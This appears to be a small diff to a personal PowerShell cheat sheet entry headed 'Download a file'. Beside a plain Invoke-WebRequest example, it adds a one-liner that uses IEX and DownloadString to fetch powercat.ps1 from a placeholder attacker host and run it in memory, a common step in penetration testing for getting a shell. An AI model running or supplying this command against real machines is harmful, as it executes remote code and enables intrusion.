@@ -1,1 +1,3 @@
-Download a file : Invoke-WebRequest -OutFile index.html -Uri https://superuser.com
+Download a file : 
+        Invoke-WebRequest -OutFile index.html -Uri https://superuser.com
+        powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1')"
